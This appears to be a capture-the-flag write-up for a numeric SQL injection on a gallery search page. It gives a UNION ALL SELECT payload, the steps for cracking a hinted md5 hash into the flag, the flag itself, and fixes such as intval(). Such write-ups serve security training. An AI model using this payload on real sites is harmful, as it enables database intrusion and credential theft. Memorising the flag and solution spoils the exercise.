# SQL Numeric Injection - Gallery

## Flag

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Description

Vulnerable SQL.

## URL

http://192.168.x.y/?page=searchimg

## Steps To Reproduce

Insert this payload :
`UNION ALL SELECT comment, title FROM list_images--`

To see, as comment for the Hack me ? picture :
`If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`
Reverse the md5 hash with crackstation, lowercase the result, then sha256 the lowercased result to get the flag.

## Why is it dangerous ?

UNION SQL exploits can let malicious users get database structure informations or user credentials (including admin ones)

## Possible fixes

- Limit the user input to numeric, with intval() for exemple
- Hash the passwords with a complex algorithm to limit the damages if someone get access to your databases anyway

## Resources

There is no additional resource for this issue.
